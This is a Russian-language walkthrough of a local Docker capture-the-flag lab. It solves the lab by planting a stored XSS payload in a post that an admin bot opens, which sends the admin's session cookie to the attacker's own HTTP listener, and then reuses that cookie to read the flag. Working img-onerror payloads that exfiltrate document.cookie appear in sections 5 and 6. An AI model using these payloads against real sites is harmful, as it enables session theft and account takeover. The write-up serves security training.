# Решение XSS Bot Lab

## Цель

Нужно получить cookie администратора, зайти под пользователем `admin`, открыть профиль и прочитать флаг из заметок.

## 1. Регистрация и изучение приложения

Запускаем командами:

```bash
sudo docker pull nshkilevich/xssbot-lab:latest

sudo docker run -d \
  --name xss-bot-lab \
  -p 127.0.0.1:8085:8080 \
  --add-host host.docker.internal:host-gateway \
  --restart unless-stopped \
  nshkilevich/xssbot-lab:latest
```

Заходим в приложение. Регистрируем нового пользователя и попадаем в ленту постов.

Изучаем доступный функционал:

- можно создавать посты;
- созданный пост можно открыть;
- пост можно отправить администратору на проверку;
- после отправки появляется уведомление;
- в разделе `Профиль` есть строка с заметками пользователя.

Заметки выглядят как конфиденциальное поле. Возможно, у пользователя `admin` в профиле есть дополнительные данные, которые помогут получить флаг.

## 2. Анализ cookie

Открываем инструменты разработчика:

```text
F12
```

Переходим во внутреннее хранилище браузера:

- Chrome/Chromium: `Application` -> `Cookies`;
- Firefox: `Storage` -> `Cookies`.

Находим cookie:

```text
session
```

Сессионный ключ выглядит примерно так:

```text
student_7f6a3c9d2e...
```

То есть он состоит из имени пользователя, нижнего подчёркивания и случайной последовательности:

```text
username_randomsequence
```

Предполагаем, что у администратора есть похожая cookie:

```text
admin_randomsequence
```

Угадать случайную часть практически невозможно, поэтому нужно найти другой способ получить cookie администратора.

## 3. Гипотеза об XSS

В приложении есть посты, которые открывает администратор. Если содержимое постов не фильтруется, можно вставить в пост исполняемый JavaScript-код.

Идея атаки:

1. Создать пост с JavaScript-кодом.
2. Отправить пост администратору.
3. Бот откроет пост под пользователем `admin`.
4. JavaScript выполнится в браузере администратора.
5. Скрипт отправит cookie администратора на наш сервер.

## 4. Поднимаем сервер для приёма запросов

На хостовой машине запускаем простой HTTP-сервер:

```bash
python3 -m http.server 8040
```

Сервер будет принимать входящие HTTP-запросы и выводить их в терминал.

Проверяем, что сервер работает. Для этого используем IP-адрес, который выдан маршрутизатором, например:

```bash
curl http://192.168.64.2:8040
```

Если в терминале с `python3 -m http.server 8040` появился входящий запрос, значит сервер поднят корректно.

Вместо `192.168.64.2` нужно подставить IP своей машины.

## 5. Проверяем выполнение XSS

Создаём пробный пост и вставляем в его содержимое код:

```html
<img src="x" onerror="new Image().src='http://192.168.64.2:8040/'">
```

После открытия такого поста браузер попробует загрузить картинку `x`. Так как такой картинки нет, сработает событие `onerror`, и JavaScript отправит запрос на наш локальный сервер.

Если на сервере появился запрос, значит JavaScript из поста выполняется.

Важно: если открыть пост самостоятельно, запрос придёт от вашего браузера. Это нормально для проверки XSS. Cookie администратора появится только после того, как пост откроет admin-bot.

## 6. Получаем cookie администратора

Теперь создаём пост с payload, который отправляет cookie:

```html
<img src="x" onerror="new Image().src='http://192.168.64.2:8040/?c=' + encodeURIComponent(document.cookie)">
```

Вместо `192.168.64.2` снова указываем IP своей машины.

Если приложение запущено в Docker и admin-bot не может достучаться до IP хоста, можно попробовать адрес:

```html
<img src="x" onerror="new Image().src='http://host.docker.internal:8040/?c=' + encodeURIComponent(document.cookie)">
```

После публикации поста нажимаем:

```text
Отправить админу
```

Ждём входящий запрос в терминале, где запущен сервер:

```text
GET /?c=session%3Dadmin_...
```

Значение после `c=` — это cookie администратора, закодированная через URL encoding.

После декодирования она будет выглядеть примерно так:

```text
session=admin_7a9e4d...
```

Нам нужно значение cookie `session`, то есть часть:

```text
admin_7a9e4d...
```

## 7. Подставляем cookie администратора

Возвращаемся в браузер и открываем cookie приложения.

Находим cookie:

```text
session
```

Заменяем её значение на полученный токен администратора:

```text
admin_7a9e4d...
```

Обновляем страницу.

Если cookie подставлена правильно, приложение будет считать нас пользователем:

```text
admin
```

## 8. Получаем флаг

Переходим во вкладку:

```text
Профиль
```

В заметках администратора находится флаг.

## Почему атака сработала

Приложение выводит содержимое постов без фильтрации HTML и JavaScript. Из-за этого пользователь может создать пост с исполняемым кодом.

Admin-bot открывает пост под учётной записью администратора. Так как cookie `session` доступна JavaScript, payload может прочитать `document.cookie` и отправить её на сервер атакующего.

После получения cookie администратора можно заменить свою cookie в браузере и открыть профиль `admin`.
